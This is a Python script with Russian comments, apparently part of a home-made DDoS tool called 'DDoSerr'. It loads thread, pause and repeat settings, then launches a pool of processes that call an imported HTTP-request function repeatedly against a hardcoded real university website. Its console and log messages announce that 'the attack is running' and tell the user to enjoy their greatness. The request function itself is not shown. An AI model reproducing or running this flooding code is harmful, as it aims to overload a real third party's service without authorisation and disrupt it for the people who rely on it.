#!/usr/bin/python3
#Путь к интерпретатору пайтона.
# -*- coding: utf-8 -*-
#Выбор кодировки (без него не работает русский язык).

"""
Модуль логгирования HTTP-запросов для DDoSerr. 
v.1.5.1b. от 09.07.2018.

Этот модуль считывает и, при необходимости, переопределяет настройки,
запускает модуль HTTP-запросов и логгирует ответы.
"""

"""
Легенда обозначений:
"___" - переделать / удалить;
"---" - отладка;
"~~~" - сделать;
"!" - первоочередная задача.
"""

#Подключаем модуль времени (задержку).
#from time import sleep
#Подключаем парсер конфига.
import configparser
#Подключаем свой модуль запросов.
import http_requests
#Подключаем модуль системных команд.
import sys
#Подключаем модуль взаимодействия с системой.
import os
#Подключаем модуль многопроцессорности и многопоточности, а точнее,
#функцию Pool.
from multiprocessing import Pool
#Подключаем готовый модуль логгирования.
import logging

#Настройка логгирования.
logging.basicConfig(filename='log.log',level=logging.INFO, format='%(asctime)s %(message)s')

class Config:
    """
    Класс для работы с конфигрурационными файлами и 
    настройками программы.
    """
    def __init__(self, argv=[], configfile="config.ini"):
        """
        Функция, использующая по умолчанию файл конфигурации
        с именем 'config.ini', в которой можно 
        переопределять настройки из командной строки и
        имя файла конфигурации.
        """
        self.read_config(configfile)
        #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        if argv:
            #Обработка параметров командной строки и 
            #переопределение настроек.
            
            pass    #Затычка, ничего не делает.
        #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    def read_config(self, configfile):
        """
        Функция загрузки настроек из файла конфигурации.        
        Механизм чтения конфига, поиска нужных значений 
        и присваивания значений пременным. 
        """
        config = configparser.ConfigParser()
        #Считываем настройки из файла конфигурации.
        config.read(configfile)
        #Читаем значения из конфига.
        #Сразу приводим их в правильный тип.
        self.proc_num = int(config.get("Settings", "ProcNum"))
        self.pause = float(config.get("Settings", "Pause"))
        self.repeat = int(config.get("Settings", "Repeat"))
          
          
    """"
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Надо сделать дополнительную функцию под ключи командной строки!
    Если заданы, то переопределяют настройки, если не заданы, то по конфигу.
    interact_input можно оставить.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    """
    
    
    def interact_input(self):
        """
        Ввод одноразовых настроек из консоли с переопределением переменных.
        Сделать вызов этой функции ключом '-i'.
        """
        #Запрос на переопределение настроек и ввод с клавиатуры.
        switch = input("Хотите ли Вы однократно переопределить заданные в конфиг-файле настройки программы?"+\
            '\n'+"Да - 'y', Нет - 'n'."+'\n'+\
            "Ваш выбор: ")
        if switch == "y":
            print("Введите свои параметры.")
            #Переопределение настроек.
            proc_num = int(input("Введите количество создаваемых потоков: "))
            pause = float(input("Введите длительность паузы между заданиями для одного процесса (секунд): "))
            repeat = int(input("Введите количество повторов запросов: "))
            #print("Вы ввели: (количество потоков, задержка в секундах, количество повторов)")
            #print(proc_num, pause, repeat)    
            
            self.proc_num = proc_num
            self.pause = pause
            self.repeat = repeat
            
        elif switch == "n":
            print("Используются настройки из файла конфигурации.")
            
    
    
    def parse_params(self, args):
        """
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Функция для переопределения настроек
        параметрами командной строки.
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        """
        pass


    """
    Запуск функции main только при запуске этого модуля, но не при импорте.
    Если функция main не задана в явном виде (def main),
    то весь код (до конструкции if __name__ == "__main__") считается ею.
    """
if __name__ == "__main__":
    
    #Загрузка настроек из фала конфигурации с сохранением в переменную.
    #Если есть параметры командной строки, то они переопределяют
    #настройки из конфига.
    cfg = Config(sys.argv)
    
    #Отладка---------------
    #print(type(cfg.proc_num))
    #print(str(cfg.proc_num))
    #----------------------
    
    #Вызов функции интерактивного ввода.
    #Позже должна вызываться только по ключу командной строки.
    cfg.interact_input()
  
    
    #Объявляем переменные в этом блоке.
    #proc = cfg.proc_num
    repeat = cfg.repeat
    pause = cfg.pause
    
    
    
    """
    Реализация многопоточности.
    #Получается n процессов: один родительский и n-1 дочерних.
    
    
    !Пока попробовать с apply_async, если не будет одновременной работы,
    то переделать под map_async.
    """
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #Сделать настройку url (из конфига и командной строки).
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    
    #(Добавить в принимаемые аргументы.)

    """
    Вместо url надо передать объект с параметрами.
    """
    url = "https://www.edu.vsu.ru"
    #url = "https://www.vsu.ru"
    
    proc = cfg.proc_num
    
    
    #Вывод информационных сообщений.
    print("Запущено " + str(proc) + " процессов." +
    " Дано " + str(repeat) + " заданий с задержкой повторения " +
    str(pause) + " секунд(ы)." + '\n' +
    "Атака выполняется. Пожалуйста, подождите и насладитесь своим величием. :)")
    #Запись их в лог.
    logging.info("Запущено " + str(proc) + " процессов." +
    " Дано " + str(repeat) + " заданий с задержкой повторения " +
    str(pause) + " секунд(ы)." + '\n' +
    "Атака выполняется. Пожалуйста, подождите и насладитесь своим величием. :)")
    

    #Создаём пул из 'proc' штук работников (процессов).
    with Pool(processes=proc) as pool:

    #Даём им задание ПО ОДНОМУ через apply_async (поэтому в цикле) 
    #и получаем результат.
    
    #!Надо проверить одновременность работы.
    #Вроде бы работает одновременно.
    
    
    #Создаётся 'proc' штук процессов с заданием ('пачка').
    #Этот цикл НЕ НАДО вызывать больше 1 раза.
        for _ in range(proc):
            result = pool.apply_async(http_requests.http_connection, (repeat, pause, url,))
            
            #Логгируем запуск процесса с его PID.
            logging.info('Process ' + str(os.getpid()) + ' was started.')
            
            #Процессы запускаются только при запросе результата от пула
            #методом get().
            
            #Можно использовать в цикле, тогда будет видно разделение
            #на пачки по количеству процессов и 
            #число запросов по количеству повторов.
            
            #Почему-то даёт None. но это сейчас не важно, т.к. не будет использоваться.
        print(result.get())
        #Без таймаута, т.к. это ограничивает время работы программы.
    
    #Вывод результата с таймаутом в 1 секунду 
    #(если вдруг будет работать слишком долго).
    #print(result.get(timeout=1))
